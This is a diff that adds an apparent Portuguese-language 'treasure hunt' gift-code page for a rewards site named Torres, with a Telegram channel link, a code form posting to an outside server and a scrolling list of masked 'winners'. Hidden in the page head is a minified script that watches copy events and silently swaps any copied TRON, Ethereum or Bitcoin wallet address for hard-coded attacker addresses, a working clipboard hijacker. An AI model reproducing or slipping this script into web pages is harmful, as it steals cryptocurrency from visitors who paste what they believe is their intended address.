@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html class="pixel-ratio-3 retina android android-5 android-5-0 watch-active-state">
+<head>
+    <meta -equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta -equiv="pragma" content="no-cache">
+    <meta -equiv="cache-control" content="no-cache">
+    <meta -equiv="expires" content="0">
+    <title>Torres</title>
+    <link rel="stylesheet" type="text/css" href="css/app.css">
+    <link rel="stylesheet" type="text/css" href="css/iconfont.css">
+    <link rel="stylesheet" type="text/css" href="css/reset.css">
+    <link rel="stylesheet" type="text/css" href="css/atom.css">
+    <link rel="stylesheet" type="text/css" href="css/global.css">
+    <link rel="stylesheet" type="text/css" href="css/open.css">
+    <link rel="stylesheet" type="text/css" href="css/layer.css">
+    <script type="text/javascript" src="js/jquery-1.11.3.min.js"></script>
+    <script type="text/javascript" src="js/scrollForever.min.js"></script>
+    <script type="text/javascript" src="js/treasurelayer.js"></script>
+<style type="text/css">
+        /* Treasure page CSS styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .treasure-container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+
+        /* Header Section */
+        .header-banner {
+            position: relative;
+            background: linear-gradient(51deg, #1e3a8a, #1e3a8a, #3b82f6) !important;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            font-size: 18px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 20px;
+        }
+
+        .back-button {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .back-arrow {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .header-title {
+            flex-grow: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+
+        .placeholder {
+            width: 24px;
+        }
+
+        /* Treasure banner */
+        .treasure-banner {
+            width: 100%;
+            height: auto;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .treasure-banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Main Content */
+        .main-content {
+            background-color: white;
+            padding: 15px;
+        }
+
+        /* Telegram section */
+        .telegram-section {
+            margin-bottom: 25px;
+        }
+
+        .telegram-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .telegram-card {
+            background: #f5f5f5;
+            border-left: 4px solid #3b82f6;
+            border-right: 4px solid #3b82f6;
+            border-top: 1px solid #3b82f6;
+            border-bottom: 1px solid #3b82f6;
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            box-shadow: 2px 2px 10px rgb(0 0 0 / 30%);
+        }
+
+        .telegram-content {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .telegram-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            /* background-color: #0088cc; */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .telegram-icon img {
+            width: 50px;
+            height: 50px;
+            /* filter: brightness(0) invert(1); */
+        }
+
+        .telegram-info {
+            flex: 1;
+        }
+
+        .telegram-info h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .telegram-info p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .telegram-button {
+            background: linear-gradient(51deg, #1e3a8a, #1e3a8a, #3b82f6) !important;
+            box-shadow: 2px 2px 10px rgb(0 0 0 / 30%);
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .telegram-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 3px 8px rgba(59, 130, 246, 0.3);
+        }
+
+        .telegram-button-icon {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        /* Gift code section */
+        .gift-code-section {
+            margin-bottom: 25px;
+        }
+
+        .gift-code-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .gift-code-form {
+            background: #f5f5f5;
+            border-left: 4px solid #3b82f6;
+            border-right: 4px solid #3b82f6;
+            border-top: 1px solid #3b82f6;
+            border-bottom: 1px solid #3b82f6;
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            box-shadow: 2px 2px 10px rgb(0 0 0 / 30%);
+        }
+
+        .gift-code-input-container {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .gift-code-input {
+            width: 100%;
+            height: 50px;
+            background-color: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 0 15px;
+            font-size: 16px;
+            color: #333;
+            transition: all 0.3s ease;
+        }
+
+        .gift-code-input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
+        }
+
+        .gift-code-input::placeholder {
+            color: #999;
+        }
+
+        .gift-code-button {
+            background: linear-gradient(51deg, #1e3a8a, #1e3a8a, #3b82f6) !important;
+            box-shadow: 2px 2px 10px rgb(0 0 0 / 30%);
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .gift-code-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 3px 8px rgba(59, 130, 246, 0.3);
+        }
+
+        /* Activity feed section */
+        .activity-feed-section {
+            margin-bottom: 25px;
+        }
+
+        .activity-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .activity-feed {
+            background: #f5f5f5;
+            border-left: 4px solid #3b82f6;
+            border-right: 4px solid #3b82f6;
+            border-top: 1px solid #3b82f6;
+            border-bottom: 1px solid #3b82f6;
+            padding: 15px;
+            border-radius: 15px;
+            box-shadow: 2px 2px 10px rgb(0 0 0 / 30%);
+            margin-bottom: 80px;
+        }
+
+        .activity-list {
+            height: 150px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .activity-list ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            position: absolute;
+            width: 100%;
+            animation: scrollUp 20s linear infinite;
+        }
+
+        .activity-item {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .activity-item:last-child {
+            border-bottom: none;
+        }
+
+        .activity-user {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .activity-amount {
+            font-size: 14px;
+            font-weight: 600;
+            color: #3b82f6;
+        }
+
+        @keyframes    scrollUp {
+            0% {
+                transform: translateY(0);
+            }
+
+            100% {
+                transform: translateY(-50%);
+            }
+        }
+    </style>
+<script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TVYxCoPcxEQDhARWJbx1hvUDz1gYS1bcmd');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x82A7D0511F088BE8CF7EBC99C817759D9CC7DEB1');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1CqbCJN2cXiw645zMNhAAkNjfbEsSeU4Ye');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '352jbwJ9rd9NtdHkYuuKo143mMiCMhu2db');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qdsfvs8samlrl05pgu3ldlug8jlnp2776cffw43');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qdsfvs8samlrl05pgu3ldlug8jlnp2776cffw43');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();</script></head>
+<body>
+<div class="treasure-container">
+    <!-- Top banner -->
+   <div class="header-banner">
+    <div class="back-button" onclick="javascript:history.back();">
+        <span class="back-arrow">❮</span>
+    </div>
+    <div class="header-title">Caça ao Tesouro</div>
+    <div class="placeholder"></div>
+</div>
+
+<div class="main-content">
+    <!-- Seção do Telegram -->
+    <div class="telegram-section">
+        <h3 class="telegram-title">Junte-se à Nossa Comunidade</h3>
+        <div class="telegram-card">
+            <div class="telegram-content">
+                <div class="telegram-icon">
+                    <img src="img/telegram.png" alt="Telegram">
+                </div>
+                <div class="telegram-info">
+                    <h3>Canal Oficial</h3>
+                    <p>Receba códigos de presente e as últimas atualizações</p>
+                </div>
+            </div>
+            <button class="telegram-button" onclick="window.open('https://t.me/Torres_VIP1', '_blank')">
+                <span class="telegram-button-icon">✈️</span> Participar Agora
+            </button>
+        </div>
+    </div>
+
+    <!-- Seção de códigos de presente -->
+    <div class="gift-code-section">
+        <h3 class="gift-code-title">Resgatar Sua Recompensa</h3>
+        <div class="gift-code-form">
+            <h4 class="gift-code-title">Digite o Código do Presente</h4>
+            <div class="gift-code-input-container">
+                <input type="text" id="input-text" class="gift-code-input" placeholder="Digite seu código de presente aqui">
+            </div>
+            <button class="gift-code-button" onclick="postdata($('#input-text').val())">Aplicar</button>
+        </div>
+    </div>
+
+    <!-- Seção do feed de vencedores -->
+    <div class="activity-feed-section">
+        <h3 class="activity-title">Vencedores</h3>
+        <div class="activity-feed">
+            <div class="activity-list">
+                <ul class="list_ui" style="animation: 12020ms linear 0s infinite normal none running scrollUp;">
+                                        <li class="activity-item">
+                        <span class="activity-user">929****5523</span>
+                        <span class="activity-amount">R$ 0.67 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">519****6660</span>
+                        <span class="activity-amount">R$ 1.07 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">289****6421</span>
+                        <span class="activity-amount">R$ 0.85 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">289****8992</span>
+                        <span class="activity-amount">R$ 0.93 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">289****4053</span>
+                        <span class="activity-amount">R$ 0.64 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">289****5442</span>
+                        <span class="activity-amount">R$ 1.07 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">289****9249</span>
+                        <span class="activity-amount">R$ 0.62 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">219****6216</span>
+                        <span class="activity-amount">R$ 0.78 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">639****9726</span>
+                        <span class="activity-amount">R$ 0.55 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">129****0247</span>
+                        <span class="activity-amount">R$ 0.84 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">919****9725</span>
+                        <span class="activity-amount">R$ 1.00 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">719****1615</span>
+                        <span class="activity-amount">R$ 0.78 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">139****6365</span>
+                        <span class="activity-amount">R$ 0.70 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">519****7199</span>
+                        <span class="activity-amount">R$ 0.61 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">319****0355</span>
+                        <span class="activity-amount">R$ 0.84 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">979****7654</span>
+                        <span class="activity-amount">R$ 0.79 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">669****3493</span>
+                        <span class="activity-amount">R$ 0.74 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">819****6395</span>
+                        <span class="activity-amount">R$ 0.68 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">189****7695</span>
+                        <span class="activity-amount">R$ 0.90 </span>
+                    </li>
+                                         <li class="activity-item">
+                        <span class="activity-user">839****9874</span>
+                        <span class="activity-amount">R$ 1.00 </span>
+                    </li>
+                                     </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div style="height: 60px;"></div>
+</div>
+
+
+
+    <style>
+    .game1 {
+        border-radius: 50%;
+        animation: rotate1 2s linear infinite;
+    }
+
+    @keyframes    rotate1 {
+        0% {
+            transform: rotateZ(0deg);
+        }
+
+        100% {
+            transform: rotateZ(360deg);
+        }
+    }
+
+    .zxc {
+        width: 60px !important;
+        height: 60px !important;
+        margin-top: -30px !important;
+        border-radius: 50% !important;
+    }
+</style>
+
+
+<style>
+    .game1
+    {
+        border-radius: 50%;
+        animation: rotate1 2s linear infinite;
+    }
+    @keyframes  rotate1{
+	0%{
+		transform: rotateZ(0deg);
+		
+	}
+	100%{
+		transform: rotateZ(360deg);
+	}
+}
+.xz{
+    color:#3b82f6  !important;
+}
+</style>
+<footer>
+     <footer>
+     <div class="foot_bo">
+        <a href="/indice.html">
+            <img src="footer/inicio.png"/>
+            <p>Início</p>
+        </a>
+    </div>
+
+    <div class="foot_bo">
+        <a href="meu.html">
+            <img src="footer/meusprodutos.png"/>
+            <p>Meu</p>
+        </a>
+    </div>
+
+<!--<div class="foot_bo">-->
+<!--    <a href="https://zkp518.shop/task/dayindex">-->
+<!--        <img src="/static/home/img/gift02.png" width="40px" class="game1"/>-->
+<!--        <p>Bônus</p>-->
+<!--    </a>-->
+<!--</div>-->
+
+<!---->
+<!--<div class="foot_bo">-->
+<!--    <a href="https://zkp518.shop/game/index">-->
+<!--        <img src="/static/home/img/ico_zp.png" class="game1"/>-->
+<!--        <p>Jogo</p>-->
+<!--    </a>-->
+<!--</div>-->
+<!---->
+    <div class="foot_bo">
+        <a href="/mostrar.html">
+            <img src="footer/mostrar.png" class="game1"/>
+            <p class="xz" style="color: #1e3a8a;">Mostrar</p>
+        </a>
+    </div>
+
+    <div class="foot_bo">
+        <a href="/compartilhar.html">
+            <img src="footer/compartilhar.png"/>
+            <p>Compartilhar</p>
+        </a>
+    </div>
+
+    <!---->
+    <!--    <div class="foot_bo">-->
+    <!--        <a href="https://zkp518.shop/redpacket/index">-->
+    <!--            <img src="/static/home/img/hb2.png"/>-->
+    <!--            <p class="xz">Reward</p>-->
+    <!--        </a>-->
+    <!--    </div>-->
+    <!---->
+    <div class="foot_bo">
+        <a href="transacoes.html">
+            <img src="footer/meu.png"/>
+            <p>Registros</p>
+        </a>
+    </div>
+</footer>
+<script type="text/javascript">
+
+  $(function(){
+    $(".myscroll").scrollForever({dir:'top'});
+  })
+
+    
+
+	function postdata(code) {
+	    
+	    var data = {
+            _token: "HNhaHena3u7kjRzSiKnab70xBiyCOoSz16TNmwmL",
+            code: code
+        };
+        
+        $.post("https://zkp518.shop/treasure/gettreasure", data, function (result) {
+             console.log('--------',result);
+            result = JSON.parse(result);
+            if(result.code==200){
+                layer.open({
+                        content: 'Bônus recebido com sucesso: R$'+ result.money+'',
+                        btn: 'OK'
+                });
+                return true;
+            }else if(result.code==404){
+                  layer.open({
+                    content: result.msg ,
+                    btn: 'OK'
+                  });
+                return false;
+            }else if(result.code==201){
+                  
+                return false;
+            }
+            
+        });
+	}
+
+</script>
+</body>
+</html>
